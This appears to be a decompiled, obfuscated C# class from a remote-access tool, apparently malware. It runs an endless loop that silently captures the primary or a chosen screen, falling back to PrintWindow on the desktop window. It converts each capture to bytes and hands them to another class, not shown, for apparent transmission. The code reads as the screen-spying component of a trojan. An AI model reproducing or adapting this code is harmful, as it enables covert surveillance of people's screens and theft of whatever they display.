using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

internal class Class5
{
	public static bool bool_0 = false;

	private static ImageConverter imageConverter_0 = Class5.smethod_8();

	private static byte[] byte_0;

	public static void smethod_0()
	{
		while (!bool_0)
		{
			try
			{
				byte_0 = (byte[])Class5.smethod_3((TypeConverter)(object)imageConverter_0, (object)smethod_1(), Class5.smethod_2(typeof(byte[]).TypeHandle));
				if (byte_0 != null)
				{
					Class2.smethod_23(byte_0);
				}
				Class5.smethod_4((Array)byte_0, 0, byte_0.Length);
				Class5.smethod_5(Class2.int_0);
			}
			catch
			{
				bool_0 = true;
				break;
			}
		}
	}

	private static Bitmap smethod_1()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Expected O, but got Unknown
		//IL_01b4: Expected O, but got Unknown
		try
		{
			if (Class2.int_6 == 0)
			{
				Rectangle rectangle = Class5.smethod_7(Class5.smethod_6());
				Bitmap val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				GC.Collect();
				GC.WaitForPendingFinalizers();
				Thread.SpinWait(5000);
				return val;
			}
			Bitmap val3 = new Bitmap(Screen.get_AllScreens()[Class2.int_6].get_Bounds().Width, Screen.get_AllScreens()[Class2.int_6].get_Bounds().Height, (PixelFormat)2498570);
			Graphics val4 = Graphics.FromImage((Image)(object)val3);
			try
			{
				val4.CopyFromScreen(Screen.get_AllScreens()[Class2.int_6].get_Bounds().X, Screen.get_AllScreens()[1].get_Bounds().Y, 0, 0, Screen.get_AllScreens()[Class2.int_6].get_Bounds().Size, (CopyPixelOperation)13369376);
			}
			finally
			{
				((IDisposable)val4)?.Dispose();
			}
			GC.Collect();
			GC.WaitForPendingFinalizers();
			Thread.SpinWait(5000);
			return val3;
		}
		catch
		{
			IntPtr intptr_ = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Progman", "Program Manager");
			Rectangle rectangle_ = default(Rectangle);
			GetWindowRect(intptr_, ref rectangle_);
			Bitmap val5 = new Bitmap(rectangle_.Width, rectangle_.Height);
			Graphics obj = Graphics.FromImage((Image)val5);
			IntPtr hdc = obj.GetHdc();
			PrintWindow(intptr_, hdc, 0u);
			obj.ReleaseHdc(hdc);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			Thread.SpinWait(5000);
			return val5;
		}
	}

	[DllImport("User32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool PrintWindow(IntPtr intptr_0, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll")]
	private static extern bool GetWindowRect(IntPtr intptr_0, ref Rectangle rectangle_0);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", CharSet = CharSet.Unicode)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	static Type smethod_2(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static object smethod_3(TypeConverter typeConverter_0, object object_0, Type type_0)
	{
		return typeConverter_0.ConvertTo(object_0, type_0);
	}

	static void smethod_4(Array array_0, int int_0, int int_1)
	{
		Array.Clear(array_0, int_0, int_1);
	}

	static void smethod_5(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static Screen smethod_6()
	{
		return Screen.get_PrimaryScreen();
	}

	static Rectangle smethod_7(Screen screen_0)
	{
		return screen_0.get_Bounds();
	}

	static ImageConverter smethod_8()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ImageConverter();
	}
}
